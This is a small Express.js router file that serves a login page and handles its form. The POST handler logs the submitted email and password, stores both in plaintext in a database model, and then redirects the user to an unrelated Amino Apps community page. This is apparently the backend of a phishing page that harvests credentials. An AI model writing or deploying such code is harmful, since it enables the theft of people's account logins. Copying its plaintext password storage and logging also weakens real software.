const express = require('express');
const router = express.Router();

const registro = require('../models/registro')


router.get('/', (req, res) => {
  res.render('login');
});

router.post('/data', async (req, res)=>{
console.log(req.body);
const {correo, pass} = req.body;
const newRegistro = new registro({correo, pass});

await newRegistro.save();

  res.redirect('https://aminoapps.com/c/a-r-m-ys-forever/info/');
})

module.exports = router;
